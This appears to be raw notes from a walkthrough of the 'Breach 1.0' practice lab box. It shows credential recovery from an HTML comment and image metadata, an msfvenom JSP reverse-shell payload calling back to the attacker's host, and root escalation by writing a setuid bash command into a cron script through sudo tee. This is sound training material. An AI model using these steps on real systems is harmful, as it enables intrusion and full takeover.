└─$ curl http://192.168.110.140/                                                     130 ⨯
<!DOCTYPE html>

<html>
<head>
<title>Welcome to Breach 1.0</title>
</head>




<body bgcolor="#000000">

<font color="green">
<p>Initech was breached and the board of directors voted to bring in their internal Initech Cyber Consulting, LLP division to assist. Given the high profile nature of the breach and nearly catastrophic losses, there have been many subsequent attempts against the company. Initech has tasked their TOP consultants, led by Bill Lumbergh, CISSP and Peter Gibbons, C|EH, SEC+, NET+, A+ to contain and perform analysis on the breach.</p> 

<p>Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach. 
However, their own work ethics and the mess left behind may be the company's downfall.</p>

<center><a href="initech.html" target="_blank"> <img src="/images/milton_beach.jpg" 
width=500 height=500> </a></center>


<!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->

</body>
</html>
                                                                                           
┌──(kali㉿kali)-[~/OSCP/boxes/Breach-1]
└─$ 

└─$ echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base64 -d | base64 -d
pgibbons:damnitfeel$goodtobeagang$ta


└─$ ssh pgibbons@192.168.110.140                                                     255 ⨯
kex_exchange_identification: read: Connection reset by peer
Connection reset by 192.168.110.140 port 22

└─$ exiftool bill.png     
ExifTool Version Number         : 12.16
File Name                       : bill.png
Directory                       : .
File Size                       : 315 KiB
File Modification Date/Time     : 2016:06:05 01:35:33+02:00
File Access Date/Time           : 2021:04:12 07:43:03+02:00
File Inode Change Date/Time     : 2021:04:12 07:42:57+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 610
Image Height                    : 327
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Comment                         : coffeestains
Image Size                      : 610x327
Megapixels                      : 0.199

x200ffffffff000000888000000000800000080000008800007ff
0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00Connection




    Sent: 2016/6/4 14:40:26FWD: Thank you for your purchase of Super Secret Cert Pro!

Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!



peter.gibbons@initech.com


Michael Bolton

Posting sensitive content

Peter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill




SSL implementation test capture Edit Delete 
Published by Peter Gibbons on 2016/6/4 21:37:05. (0 reads)
Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.



root@kali:~/evidence/breach 1.0# keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype PKCS12 -srcalias tomcat

keytool -importkeystore \
    -srckeystore keystore.jks \
    -destkeystore keystore.p12 \
    -deststoretype PKCS12 \
    -srcalias tomcat \
    -deststorepass tomcat \
    -destkeypass tomcat


msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f war > update.war


msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
PAYLOAD => java/meterpreter/reverse_tcp

Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.110.1    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


ls -al /home/
total 16
drwxr-xr-x  4 root      root      4096 Jun  4  2016 .
drwxr-xr-x 22 root      root      4096 Jun  4  2016 ..
drwxr-xr-x  3 blumbergh blumbergh 4096 Jun 12  2016 blumbergh
drwxr-xr-x  3 milton    milton    4096 Jun  6  2016 milton



tomcat6@Breach:/etc$ su blumbergh
su blumbergh
Password: coffeestains

blumbergh@Breach:/etc$ sudo -l
sudo -l
Matching Defaults entries for blumbergh on Breach:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on Breach:
    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh


cat /usr/share/cleanup/tidyup.sh
#!/bin/bash

#Hacker Evasion Script 
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
blumbergh@Breach:/etc$ 



echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

blumbergh@Breach:/tmp$ ./bash -p
./bash -p
bash-4.3# id
id
uid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) groups=0(root),1001(blumbergh)

bash-4.3# cat b.c
cat b.c
void main() {
        setreuid(geteuid(), getuid());
        setregid(getegid(), getgid());
        system("/bin/bash");
}
bash-4.3# gcc b.c -o b
gcc b.c -o b
bash-4.3# ./b
./b
bash-4.3# id
id
uid=0(root) gid=1001(blumbergh) groups=0(root),1001(blumbergh)
